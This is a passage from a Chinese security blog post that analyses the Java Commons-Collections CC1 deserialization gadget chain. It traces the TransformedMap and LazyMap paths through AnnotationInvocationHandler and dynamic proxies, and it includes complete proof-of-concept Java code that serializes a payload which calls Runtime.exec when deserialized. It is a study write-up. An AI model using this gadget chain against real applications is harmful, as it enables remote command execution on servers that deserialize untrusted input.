ObjectOutputStream(new FileOutputStream(file));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">    public static void payloadTest(String file) throws Exception &#123;</span><br><span class="line">        //读取写入的payload，并进行反序列化</span><br><span class="line">        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            AnnotationInvocationHandler.readObject()</span><br><span class="line">                MapEntry.setValue()</span><br><span class="line">                    TransformedMap.checkSetValue()</span><br><span class="line">                            ChainedTransformer.transform()</span><br><span class="line">                                ConstantTransformer.transform()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Class.getMethod()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.getRuntime()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.exec()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>这里再看cc1另一个方法，使用lazymap，这里可能需要一点动态代理的知识</p>
+<p>推荐的话，可以去看看</p>
+<p><a target="_blank" rel="noopener" href="https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984">https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yaomingyang/article/details/80981004">https://blog.csdn.net/yaomingyang/article/details/80981004</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/20794107">https://www.zhihu.com/question/20794107</a></p>
+<p>而且lazymap这条链子与TransformedMap那条只有前半部分不同</p>
+<h2 id="lazymap"><a href="#lazymap" class="headerlink" title="lazymap"></a>lazymap</h2><p>当看到这里的时候，我还是希望大家，想一想，我们为什么之前是为什么要使用TransformedMap的以助于思考</p>
+<p>LazyMap和TransformedMap类似，都来自于Common-Collections库，并继承 AbstractMapDecorator。 LazyMap的漏洞触发点和TransformedMap唯一的差别是，TransformedMap是在写入元素的时候执 行transform，而LazyMap是在其get方法中执行的 factory.transform 。其实这也好理解，LazyMap 的作用是“懒加载”，在get找不到值的时候，它会调用 factory.transform 方法去获取一个值：</p>
+<p><img src="https://i.loli.net/2021/10/04/JtdZIprcLPOMK83.png"></p>
+<p>这里如何调用到 factory.transfo们rm,if进入的条件是我们传入的map不要有后面传入的key，也就是调用get的时候不要传入参数</p>
+<p>接下来，只需要去寻找到一个readObject方法中调用了此get方法就好了</p>
+<h3 id="AnnotationInvocationHandler-1"><a href="#AnnotationInvocationHandler-1" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p>sun.reflect.annotation.AnnotationInvocationHandler 的readObject方法中并没有直接调用到 Map的get方法。 所以ysoserial找到了另一条路，AnnotationInvocationHandler类的invoke方法有调用到get：</p>
+<p>这里就涉及到了一点动态代理的知识</p>
+<p>我们可以看到，AnnotationInvocationHandler是继承了InvocationHandler，所以我们可以使用动态代理，调用代理类的invoke方法</p>
+<p><img src="https://i.loli.net/2021/10/04/HzB6KDSOW48gVwy.png" alt="image-20211004181800897"></p>
+<p>AnnotationInvocationHandler类的invoke方法</p>
+<p><img src="https://i.loli.net/2021/10/04/fKwO8SQJxhEc1Uj.png" alt="image-20211004194149881"></p>
+<p>我们的memberValues成员为lazymap对象(memberValues的赋值在构造函数中,且我们可控)。还是和原来一样，因为</p>
+<p><img src="https://i.loli.net/2021/10/04/K9YIZW4LVMDQyJO.png" alt="image-20211004194407719"></p>
+<p>,当我们执行到下面这里的时候,就会触发代理机制,然后进入Invoke方法,从而触发命令执行</p>
+<p><img src="https://i.loli.net/2021/10/04/o28XeiHRAuJ6WLn.png" alt="image-20211004195707791"></p>
+<p>为什么是这里？通过之前分析TransformedMap说的，readObject方法中的memberValues其实是我们传入的lazymap对象，使用动态代理。每次调用lazymap中的方法就会去触发AnnotationInvocationHandler的invoke方法</p>
+<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>借用涛涛的攻击流程图<img src="https://i.loli.net/2021/10/04/wbaEB8VlDTGWoRd.png" alt="img"></p>
+<p>poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.annotation.Retention;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">public class CommonCollections12 &#123;</span><br><span class="line">    public static Object generatePayload() throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new Object[] &#123; &quot;calc&quot; &#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innermap = new HashMap();</span><br><span class="line">        innermap.put(&quot;value&quot;, &quot;xxx&quot;);</span><br><span class="line">        Map outmap = LazyMap.decorate(innermap,transformerChain);</span><br><span class="line">        //通过反射获得AnnotationInvocationHandler类对象</span><br><span class="line">        Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        //通过反射获得cls的构造函数</span><br><span class="line">        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        //这里需要设置Accessible为true，否则序列化失败</span><br><span class="line">        ctor.setAccessible(true);</span><br><span class="line">        //通过newInstance()方法实例化对象</span><br><span class="line">        InvocationHandler handler = (InvocationHandler)ctor.newInstance(Retention.class, outmap);//使用Retention.class是因为，初始化的时候要求var1 为Class&lt;? extends Annotation&gt;</span><br><span class="line">        Map mapProxy = (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),handler);</span><br><span class="line">        Object instance = ctor.newInstance(Retention.class, mapProxy);</span><br><span class="line"></span><br><span class="line">        return instance;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        payload2File(generatePayload(),&quot;obj&quot;);</span><br><span class="line">        payloadTest(&quot;obj&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void payload2File(Object instance, String file)</span><br><span class="line">            throws Exception &#123;</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(file));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">    public static void payloadTest(String file) throws Exception &#123;</span><br><span class="line">        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9873#toc-19">https://xz.aliyun.com/t/9873#toc-19</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1242/#commonscollections-1">https://paper.seebug.org/1242/#commonscollections-1</a></p>
+<p>Java安全漫谈 - 10.用TransformedMap编写真正的POC.pdf</p>
+<p>java安全漫谈 - 11.反序列化篇(5).pdf</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># java反序列化</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/10/04/URLDNS%E5%88%86%E6%9E%90/" rel="prev" title="URLDNS分析">
+      <i class="fa fa-chevron-left"></i> URLDNS分析
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#cc%E9%93%BE1%E7%AE%80%E5%8C%96"><span class="nav-number">1.</span> <span class="nav-text">cc链1简化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TransformedMap"><span class="nav-number">2.</span> <span class="nav-text">TransformedMap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#transformer"><span class="nav-number">3.</span> <span class="nav-text">transformer</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ConstantTransformer"><span class="nav-number">3.1.</span> <span class="nav-text">ConstantTransformer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#InvokerTransformer"><span class="nav-number">3.2.</span> <span class="nav-text">InvokerTransformer</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ChainedTransformer"><span class="nav-number">4.</span> <span class="nav-text">ChainedTransformer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AbstractInputCheckedMapDecorator"><span class="nav-number">5.</span> <span class="nav-text">AbstractInputCheckedMapDecorator</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AnnotationInvocationHandler"><span class="nav-number">6.</span> <span class="nav-text">AnnotationInvocationHandler</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#java-lang-annotation-Retention"><span class="nav-number">7.</span> <span class="nav-text">java.lang.annotation.Retention</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#poc"><span class="nav-number">8.</span> <span class="nav-text">poc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE"><span class="nav-number">9.</span> <span class="nav-text">调用链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lazymap"><span class="nav-number">10.</span> <span class="nav-text">lazymap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#AnnotationInvocationHandler-1"><span class="nav-number">10.1.</span> <span class="nav-text">AnnotationInvocationHandler</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="nav-number">10.2.</span> <span class="nav-text">攻击流程</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="LaNyer640"
+      src="https://i.loli.net/2021/10/01/JgS6Ude2xi7Afpq.jpg">
+  <p class="site-author-name" itemprop="name">LaNyer640</p>
+  <div class="site-description" itemprop="description">道格幼儿园的小朋友</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/LaNyer640" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;LaNyer640" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1308229817@qq.com" title="E-Mail → 1308229817@qq.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://the_itach1.gitee.io/" title="https:&#x2F;&#x2F;the_itach1.gitee.io&#x2F;" rel="noopener" target="_blank">The_Itach1</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://ih0lmes.gitee.io/" title="https:&#x2F;&#x2F;ih0lmes.gitee.io&#x2F;" rel="noopener" target="_blank">iH0lmes</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://woshilnp.github.io/" title="https:&#x2F;&#x2F;woshilnp.github.io&#x2F;" rel="noopener" target="_blank">woshilnp</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">LaNyer640</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
